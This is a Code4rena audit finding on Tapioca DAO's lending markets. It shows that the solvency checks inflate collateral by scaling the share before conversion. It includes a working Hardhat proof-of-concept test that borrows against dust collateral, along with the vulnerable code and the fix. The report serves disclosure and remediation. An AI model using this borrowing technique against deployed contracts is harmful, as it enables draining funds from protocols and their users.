---
tags:
  - lang/solidity
  - platform/code4rena
  - has/github
  - has/poc
  - severity/high
  - sector/governance
  - sector/lending
  - sector/token
protocol: "[[Tapioca DAO]]"
auditors:
  - "[[zzzitron]]"
report: "https://code4rena.com/reports/2023-07-tapioca"
genome:
  - "[[liquidation-logic]]"
  - "[[data-corruption/price-manipulation]]"
  - "[[liquidation-underwater]]"
  - "[[oracle-manipulation-resistance]]"
---
# [H-45] `SGLLiquidation::_computeAssetAmountToSolvency`, `Market::_isSolvent` and `Market::_computeMaxBorrowableAmount` may overestimate the collateral, resulting in false solvency

- id: 27535
- impact: HIGH
- protocol: [[Tapioca DAO]]
- reporter: zzzitron (Code4rena)
- source: https://code4rena.com/reports/2023-07-tapioca

## Summary


A bug has been identified in the Tapioca-DAO/tapioca-bar-audit repository. The bug in question allows users to borrow assets even when there is no collateral amount from the user's share. This is due to a calculation error in the `Market::_isSolvent` and `Market::_computeMaxBorrowableAmount` functions, which falsely consider the position as solvent. This results in a loss for the user.

A proof of concept has been provided to demonstrate this bug. The result of the test shows that the deployer is able to borrow 748 of asset, even though the collateral share is not enough for any amount of collateral. Similarly, the Singularity will liquidate less than it should, due to the same calculation error.

The problem stems from the calculation error, where multiplies the user's collateral share with `EXCHANGE_RATE_PRECISION` and `collateralizationRate` before calling `yieldBox.toAmount`. This will give an inflated amount, resulting in false solvency.

The recommended mitigation steps to fix this bug is to modify the `Market::_isSolvent` and `Market::_computeMaxBorrowableAmount` functions to evaluate the value of collateral like the `BigBang::_updateBorrowAndCollateralShare` function, (e.i. calculate the exchangeRate and collateralizationRate after converting the share to asset). 

This bug has been confirmed by 0xRektora (Tapioca).

## Details


<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/Market.sol#L415-L421> 

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/Market.sol#L385-L399> 

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L781-L785> 

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/singularity/SGLLiquidation.sol#L80-L87>

An user can borrow via `BigBang::borrow` when there is no collateral amount from the user's share. The `BigBang` will falsely consider the position as solvent, when it is not, resulting in a loss.

A similar issue presents in the Singularity as `SGLLiquidation::_computeAssetAmountToSolvency` will overestimate the collateral, therefore liquidate less than it should.

### Proof of Concept

The following proof of concept demonstrates that au user could borrow some assets, even though the collateral share will not give any amount of collateral.

Put the full PoC in the following gist into `test/bigBang.test.ts` in tapiocabar-audit.

<https://gist.github.com/zzzitron/14482ea3ab35b08421e7751bac0c2e3f>

<details>

```javascript
        it('considers me solvent even when I have enough share for any amount PoCBorrow', async () => {
            ///////
            // setup is omitted
            // full poc is https://gist.github.com/zzzitron/14482ea3ab35b08421e7751bac0c2e3f
            ///////

            const wethCollateralShare = ethers.BigNumber.from((1e8).toString()).sub(1);
            await wethBigBangMarket.addCollateral(
                deployer.address,
                deployer.address,
                false,
                0,
                wethCollateralShare,
                // valShare,
            );

            // log
            let userCollateralShare = await wethBigBangMarket.userCollateralShare(deployer.address);
            console.log("userCollateralShare: ", userCollateralShare.toString());
            let userCollateralShareToAmount = await yieldBox.toAmount(wethAssetId, userCollateralShare, false);
            console.log("userCollateralShareToAmount: ", userCollateralShareToAmount.toString());
            let collateralPartInAsset = (await yieldBox.toAmount(wethAssetId, userCollateralShare.mul(1e13).mul(75000), false))
            console.log("collateralPart in asset times exchangerRate", collateralPartInAsset.toString())
            const exchangeRate = await wethBigBangMarket.exchangeRate();
            console.log("exchangeRate:",exchangeRate.toString());
            console.log("can borrow this much:",collateralPartInAsset.div(exchangeRate).toString());


            //borrow even though the collateral share is not enough for any amount of collateral
            const usdoBorrowVal = collateralPartInAsset.div(exchangeRate).sub(1)

            await wethBigBangMarket.borrow(
                deployer.address,
                deployer.address,
                usdoBorrowVal,
            );

            let userBorrowPart = await wethBigBangMarket.userBorrowPart(
                deployer.address,
            );
            expect(userBorrowPart.gt(0)).to.be.true;
            console.log(userBorrowPart.toString())
        });
```

</details>

The result of the test is:

      BigBang test
        poc
    userCollateralShare:  99999999
    userCollateralShareToAmount:  0
    collateralPart in asset times exchangerRate 749999992500000000
    exchangeRate: 1000000000000000
    can borrow this much: 749
    748
          ✔ considers me solvent even when I have enough share for any amount PoCBorrow (12405ms)

In the scenario above, The deployer is adding share of collateral to the bigbang using `BigBang::addCollateral`. The added amount in the below example is (1e8 - 1), which is too small to get any collateral from the YieldBox, as the `yieldBox.toAmount` is zero.

However, due to the calculation error in the `Market::_isSolvent`, the deployer could borrow 748 of asset. Upon withdrawing the yieldBox will give zero amount of collateral, but the BigBang let the user borrow non zero amount of asset.

Similarly one can show that `Singularity` will liquidate less than it should, due to similar calculation error.

### details of the bug

The problem stems from the calculation error, where multiplies the user's collateral share with `EXCHANGE_RATE_PRECISION` and `collateralizationRate` before calling `yieldBox.toAmount`.
It will give inflated amount, resulting in false solvency.

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/Market.sol#L415-L421>

```solidity
        return
            yieldBox.toAmount(
                collateralId,
                collateralShare *
                    (EXCHANGE_RATE_PRECISION / FEE_PRECISION) *
                    collateralizationRate,
                false
            ) >=

```

The same calculation happens in the `Market::_computeMaxBorrowableAmount`

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/Market.sol#L385-L399>

In the BigBang's liquidating logic (e.i. in the `BigBang::_updateBorrowAndCollateralShare`), the conversion from the share of collateral to the asset is calculated correctly:

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L781-L785>

```solidity
        uint256 collateralPartInAsset = (yieldBox.toAmount(
            collateralId,
            userCollateralShare[user],
            false
        ) * EXCHANGE_RATE_PRECISION) / _exchangeRate;
```

However, the position in question will not get to this logic, even if `BigBang::liquidate` is called on the position, since the `_isSolvent` will falsely consider the position as solvent.

Similarly the `Singularity` will overestimate the collateral in the same manner.

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/singularity/SGLLiquidation.sol#L70-L90>

```solidity
    function _computeAssetAmountToSolvency(
        address user,
        uint256 _exchangeRate
    ) private view returns (uint256) {
        // accrue must have already been called!
        uint256 borrowPart = userBorrowPart[user];
        if (borrowPart == 0) return 0;
        uint256 collateralShare = userCollateralShare[user];

        Rebase memory _totalBorrow = totalBorrow;

        uint256 collateralAmountInAsset = yieldBox.toAmount(
            collateralId,
            (collateralShare *
                (EXCHANGE_RATE_PRECISION / FEE_PRECISION) *
                lqCollateralizationRate),
            false
        ) / _exchangeRate;
        // Obviously it's not `borrowPart` anymore but `borrowAmount`
        borrowPart = (borrowPart * _totalBorrow.elastic) / _totalBorrow.base;
```

### Recommended Mitigation Steps

The `Market::_isSolvent` and `Market::_computeMaxBorrowableAmount`  should evaluate the value of collateral like `BigBang::_updateBorrowAndCollateralShare` function, (e.i. calculate the exchangeRate and collateralizationRate after converting the share to asset).

<!-- zzzitron H-Market-isSolvent-PoCBorrow -->

**[0xRektora (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/915#issuecomment-1700227210)**

***
